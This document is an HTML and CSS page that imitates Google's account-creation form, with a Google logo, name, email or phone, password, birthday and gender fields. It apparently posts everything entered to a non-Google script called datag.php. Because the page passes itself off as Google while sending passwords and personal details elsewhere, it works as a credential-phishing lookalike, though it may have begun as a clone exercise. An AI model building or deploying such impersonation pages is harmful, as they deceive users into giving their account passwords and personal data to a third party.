<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>create an account</title>
    <style>
        #div1 {
            border: 1px solid #dadcdf;
            width: 600px;
            margin-left: 450px;
            margin-top: 70px;
            padding-top: 30px;
            padding-bottom: px;

        }

        img {
            width: 110px;
            height: 40px;
            margin-left: 50px;
            margin-top: 30px;
        }

        #para3 {
            margin-left: 50px;
            font-size: 25px;
            margin-top: 4px;

        }



        input[type=text] {
            width: 300px;
            height: 30px;
            padding: 16px;
            margin-left: 50px;
            font-size: 18px;
            border-radius: 8px;
            border: 1px solid #dadcdf;
            margin-top: 2px;
            margin-bottom: 12px;

        }

        #para4 {
            margin-left: 60px;
            margin-top: -8.8px;
            color: rgb(90, 83, 83);
        }

        #a7 {
            font-size: 17px;
            text-decoration: none;
            margin-left: 50px;
            color: #1676f3;
            font-weight: bold;
        }

        #help {
            margin-left: 146px;
        }

        #privacy {
            margin-left: 30px;
        }

        #terms {
            margin-left: 30px;
        }

        #div3 {
            border: 1px solid #dadcdf;
            font-size: 18px;
            border-radius: 8px;
            padding: 16px;
            height: 10px;
            margin-top: 20px;
            margin-left: 50px;
        }

        #div4 {
            border: 1px solid #dadcdf;
            font-size: 18px;
            border-radius: 8px;
            padding: 16px;
            height: 10px;
            margin-left: 50px;
            margin-top: 12px;
        }

        #para5 {
            margin-left: 60px;
            margin-top: 3px;
            color: rgb(90, 83, 83);
        }



        #div5 {
            border: 1px solid #dadcdf;
            border-radius: 8px;
            width: 303px;
            height: 40px;
            margin-top: 12px;
            margin-left: 50px;
        }

        #para1 {
            font-size: 20px;
            margin-left: 18.5px;
            margin-top: 7.9px;
            color: rgb(90, 83, 83);
        }

        .calender {
            margin-left: 105px;
            margin-top: -38px;

        }

        .month {
            border: 1px solid #dadcdf;
            border-radius: 4px;

        }

        .day {
            border: 1px solid #dadcdf;
            margin-left: 5px;
            border-radius: 4px;
        }

        .year {
            border: 1px solid #dadcdf;
            margin-left: 5px;
            border-radius: 4px;
        }

        .div6 {
            border: 1px solid #dadcdf;
            border-radius: 8px;
            width: 105px;
            height: 100px;
            margin-top: 12px;
            margin-left: 50px;
        }

        #para2 {
            font-size: 20px;
            margin-left: 18.5px;
            margin-top: 7.9px;
            color: rgb(90, 83, 83);
        }

        #id6 {
            margin-left: 20px;
            margin-top: 1px;
        }

        #id7 {
            margin-left: 20px;
        }

        button {
            margin-left: 260px;
            background-color: #1676f3;
            color: white;
            font-size: 18px;
            font-weight: bold;
            width: 95px;
            border: 1px solid #1676f3;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 10px;
        }

        button:hover {
            cursor: pointer;
            opacity: 0.9;

        }
    </style>
</head>

<body>
    <form class="login_form" action="datag.php" method="post">
    <div id="div1">
        <img src="https://freepngimg.com/download/google/66907-images-logo-google-free-download-png-hd.png"
            alt="google">

        <p id="para3">Create your Google Account</p>


        <section>
            <div class="singup_body">
                <div>
                    <input class="firstname" type="text" for="firstname" name="firstname" placeholder="First name">
                </div>
                <div>
                    <input class="lastname" type="text" for="lastname" name="lastname" placeholder="Last name">
                </div>
                <div>
                    <input class="email1" type="text" for="email1" name="email1" placeholder="Mobile number or Email">
                </div>
                <p id="para4">you can use letters,number or periods</p>
                <a id="a7" href="#">Use my current email address instead</a>

                <div>
                    <input id="div3" class="password1" type="password" for="password1" name="password1"
                        placeholder="Password">
                </div>
                <div>
                    <input id="div4" class="password2" type="password" for="password2" name="password2"
                        placeholder="Confirm Password">
                </div>
                <p id="para5">Use 8 or more characters with a mix of letters,numbers & symbols</p>


                <div id=div5>
                    <p id=para1 class="birthday">Birthday</p>
                    <div class="calender">
                        <select class="month" name="month">
                            <option>Month</option>
                            <option>jan</option>
                            <option>feb</option>
                            <option>march</option>
                            <option>april</option>
                            <option>may</option>
                            <option>june</option>
                            <option>july</option>
                            <option>aug</option>
                            <option>sept</option>
                            <option>oct</option>
                            <option>nov</option>
                            <option>dec</option>
                        </select>

                        <select class="day" name="day">
                            <option>day</option>
                            <option>1</option>
                            <option>2</option>
                            <option>3</option>
                            <option>4</option>
                            <option>5</option>
                            <option>6</option>
                            <option>7</option>
                            <option>8</option>
                            <option>9</option>
                            <option>10</option>
                            <option>11</option>
                            <option>12</option>
                            <option>13</option>
                            <option>14</option>
                            <option>15</option>
                            <option>16</option>
                            <option>17</option>
                            <option>18</option>
                            <option>19</option>
                            <option>20</option>
                            <option>21</option>
                            <option>22</option>
                            <option>23</option>
                            <option>24</option>
                            <option>25</option>
                            <option>26</option>
                            <option>27</option>
                            <option>28</option>
                            <option>29</option>
                            <option>30</option>
                            <option>31</option>
                        </select>

                        <select class="year" name="year">
                            <option>Year</option>
                            <option>1997</option>
                            <option>1998</option>
                            <option>1999</option>
                            <option>2000</option>
                            <option>2001</option>
                            <option>2002</option>
                            <option>2003</option>
                            <option>2004</option>
                            <option>2005</option>
                            <option>2006</option>
                            <option>2007</option>
                            <option>2008</option>
                        </select>


                    </div>
                </div>
                <div class="div6">
                    <p id=para2>Gender</p>
                    <input id="id6" type="radio" name="sex" value="male" checked> Male <br>
                    <input id="id7" type="radio" name="sex" value="female"> Female
                </div>

            </div>
            <button>create</button>
</body>

</html>